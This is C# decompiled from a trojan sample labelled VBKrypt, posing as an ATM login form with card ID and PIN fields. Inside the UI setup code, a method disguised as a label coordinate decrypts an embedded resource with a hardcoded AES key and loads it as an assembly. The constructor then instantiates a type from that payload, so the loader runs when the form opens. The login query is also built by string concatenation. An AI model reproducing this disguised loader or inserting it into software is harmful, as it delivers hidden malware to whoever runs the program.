// Decompiled with JetBrains decompiler
// Type: ATM_Final.LoginForm
// Assembly: ICollect, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 87EB3EDA-C82B-436C-8586-AD11341AC415
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan.MSIL.VBKrypt.gen-1b3142627fb58811a7d165f0ba285d5f658434737caa0b571f7d37403f9d691d.exe

using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ATM_Final
{
  public class LoginForm : Form
  {
    private GlobalDBConnection gdc = new GlobalDBConnection();
    private Show show = new Show();
    private IContainer components = (IContainer) null;
    private static object NullTextWriter;
    private static System.Type CompletedSync = typeof (AccountInfoForm);
    private Label lbl_CardID;
    private Label lbl_PIN;
    private TextBox txt_CardID;
    private TextBox txt_PIN;
    private Label lbl_SelectLang;
    private Button btn_enflag;
    private Button btn_bsflag;
    private PictureBox en_flag;
    private Button btn_Login;
    private Button btn_Exit;

    public LoginForm()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) LoginForm.NullTextWriter, (object) "4173796E6353746174654D616368696E65417474726962", (object) "5A7678514D31", (object) "ATM_Final");
      this.txt_PIN.PasswordChar = '*';
      this.txt_PIN.MaxLength = 4;
      this.txt_CardID.MaxLength = 4;
    }

    private void getRes(CultureInfo ci)
    {
      ResourceManager resourceManager = new ResourceManager("ATM_Final.Lang.langres", Assembly.Load("ATM_Final"));
      this.lbl_SelectLang.Text = resourceManager.GetString("selectlang", ci);
      this.lbl_CardID.Text = resourceManager.GetString("cardid", ci);
      this.lbl_PIN.Text = resourceManager.GetString("pin", ci);
      this.en_flag.Image = (Image) resourceManager.GetObject("flag", ci);
      this.btn_Login.Text = resourceManager.GetString("login", ci);
      this.btn_Exit.Text = resourceManager.GetString("exit", ci);
    }

    private void LoginForm_Load(object sender, EventArgs e)
    {
    }

    private void btn_Exit_Click(object sender, EventArgs e) => Environment.Exit(0);

    private void btn_Login_Click(object sender, EventArgs e)
    {
      SqlConnection connection = new SqlConnection(this.gdc.Con);
      SqlCommand sqlCommand = new SqlCommand("Command String", connection);
      try
      {
        connection.Open();
        int num1 = int.Parse(this.txt_CardID.Text);
        int num2 = int.Parse(this.txt_PIN.Text);
        int num3 = 0;
        int num4 = 0;
        string str = (string) null;
        sqlCommand.CommandText = "SELECT * FROM [Table] WHERE AccNo = '" + num1.ToString() + "'";
        SqlDataReader sqlDataReader = sqlCommand.ExecuteReader();
        while (sqlDataReader.Read())
        {
          num3 = int.Parse(sqlDataReader["AccNo"].ToString());
          num4 = int.Parse(sqlDataReader["PIN"].ToString());
          str = sqlDataReader["Name"].ToString();
        }
        connection.Close();
        connection.Dispose();
        if (num1 == num3 && num2 == num4)
        {
          int num5 = (int) MessageBox.Show("Welcome: " + str);
          this.show.AccNo = num3;
          new WelcomeForm().Show();
          this.Hide();
        }
        else
        {
          int num6 = (int) MessageBox.Show("Cannot find an account! Please try again!");
          this.txt_CardID.Clear();
          this.txt_PIN.Clear();
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message);
      }
    }

    private void btn_enflag_Click(object sender, EventArgs e) => this.getRes(new CultureInfo("en-US"));

    private void btn_bsflag_Click(object sender, EventArgs e) => this.getRes(new CultureInfo("hr-HR"));

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static double Valuabe()
    {
      byte[] inputBuffer = (byte[]) new ResourceManager(LoginForm.CompletedSync).GetObject("XamarinStudio");
      byte[] hash = new SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes("E55BU44R2GH44U6FA5A5F4"));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.Key = hash;
      rijndaelManaged.Mode = CipherMode.ECB;
      LoginForm.NullTextWriter = (object) ((Assembly) LoginForm.THAI04(rijndaelManaged.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length))).GetExportedTypes()[1];
      return 0.122;
    }

    public static object THAI04(byte[] ConstructionCall) => (object) Thread.GetDomain().Load(ConstructionCall);

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (LoginForm));
      this.lbl_CardID = new Label();
      this.lbl_PIN = new Label();
      this.txt_CardID = new TextBox();
      this.txt_PIN = new TextBox();
      this.lbl_SelectLang = new Label();
      this.btn_enflag = new Button();
      this.btn_bsflag = new Button();
      this.en_flag = new PictureBox();
      this.btn_Login = new Button();
      this.btn_Exit = new Button();
      ((ISupportInitialize) this.en_flag).BeginInit();
      this.SuspendLayout();
      this.lbl_CardID.AutoSize = true;
      this.lbl_CardID.Font = new Font("Modern No. 20", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lbl_CardID.Location = new Point((int) LoginForm.Valuabe(), 162);
      this.lbl_CardID.Name = "lbl_CardID";
      this.lbl_CardID.Size = new Size(72, 21);
      this.lbl_CardID.TabIndex = 2;
      this.lbl_CardID.Text = "Card ID";
      this.lbl_PIN.AutoSize = true;
      this.lbl_PIN.Font = new Font("Modern No. 20", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lbl_PIN.Location = new Point(27, 240);
      this.lbl_PIN.Name = "lbl_PIN";
      this.lbl_PIN.Size = new Size(43, 21);
      this.lbl_PIN.TabIndex = 3;
      this.lbl_PIN.Text = "PIN";
      this.txt_CardID.Location = new Point(129, 163);
      this.txt_CardID.Name = "txt_CardID";
      this.txt_CardID.Size = new Size(197, 20);
      this.txt_CardID.TabIndex = 4;
      this.txt_PIN.Location = new Point(129, 243);
      this.txt_PIN.Name = "txt_PIN";
      this.txt_PIN.Size = new Size(197, 20);
      this.txt_PIN.TabIndex = 5;
      this.lbl_SelectLang.AutoSize = true;
      this.lbl_SelectLang.Font = new Font("Modern No. 20", 24f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.lbl_SelectLang.Location = new Point(1, 37);
      this.lbl_SelectLang.Name = "lbl_SelectLang";
      this.lbl_SelectLang.Size = new Size(325, 34);
      this.lbl_SelectLang.TabIndex = 6;
      this.lbl_SelectLang.Text = "Please select a language";
      this.btn_enflag.BackgroundImage = (Image) componentResourceManager.GetObject("btn_enflag.BackgroundImage");
      this.btn_enflag.Location = new Point(346, 35);
      this.btn_enflag.Name = "btn_enflag";
      this.btn_enflag.Size = new Size(75, 36);
      this.btn_enflag.TabIndex = 7;
      this.btn_enflag.UseVisualStyleBackColor = true;
      this.btn_enflag.Click += new EventHandler(this.btn_enflag_Click);
      this.btn_bsflag.BackgroundImage = (Image) componentResourceManager.GetObject("btn_bsflag.BackgroundImage");
      this.btn_bsflag.Location = new Point(437, 35);
      this.btn_bsflag.Name = "btn_bsflag";
      this.btn_bsflag.Size = new Size(75, 36);
      this.btn_bsflag.TabIndex = 8;
      this.btn_bsflag.UseVisualStyleBackColor = true;
      this.btn_bsflag.Click += new EventHandler(this.btn_bsflag_Click);
      this.en_flag.BackgroundImage = (Image) componentResourceManager.GetObject("en_flag.BackgroundImage");
      this.en_flag.InitialImage = (Image) componentResourceManager.GetObject("en_flag.InitialImage");
      this.en_flag.Location = new Point(387, 275);
      this.en_flag.Name = "en_flag";
      this.en_flag.Size = new Size(125, 65);
      this.en_flag.TabIndex = 9;
      this.en_flag.TabStop = false;
      this.btn_Login.ForeColor = SystemColors.ActiveCaptionText;
      this.btn_Login.Location = new Point(129, 317);
      this.btn_Login.Name = "btn_Login";
      this.btn_Login.Size = new Size(75, 23);
      this.btn_Login.TabIndex = 10;
      this.btn_Login.Text = "Login";
      this.btn_Login.UseVisualStyleBackColor = true;
      this.btn_Login.Click += new EventHandler(this.btn_Login_Click);
      this.btn_Exit.ForeColor = SystemColors.ActiveCaptionText;
      this.btn_Exit.Location = new Point(251, 317);
      this.btn_Exit.Name = "btn_Exit";
      this.btn_Exit.Size = new Size(75, 23);
      this.btn_Exit.TabIndex = 11;
      this.btn_Exit.Text = "Exit";
      this.btn_Exit.UseVisualStyleBackColor = true;
      this.btn_Exit.Click += new EventHandler(this.btn_Exit_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ActiveCaptionText;
      this.ClientSize = new Size(524, 387);
      this.Controls.Add((Control) this.btn_Exit);
      this.Controls.Add((Control) this.btn_Login);
      this.Controls.Add((Control) this.en_flag);
      this.Controls.Add((Control) this.btn_bsflag);
      this.Controls.Add((Control) this.btn_enflag);
      this.Controls.Add((Control) this.lbl_SelectLang);
      this.Controls.Add((Control) this.txt_PIN);
      this.Controls.Add((Control) this.txt_CardID);
      this.Controls.Add((Control) this.lbl_PIN);
      this.Controls.Add((Control) this.lbl_CardID);
      this.ForeColor = SystemColors.ControlLightLight;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (LoginForm);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (LoginForm);
      this.Load += new EventHandler(this.LoginForm_Load);
      ((ISupportInitialize) this.en_flag).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
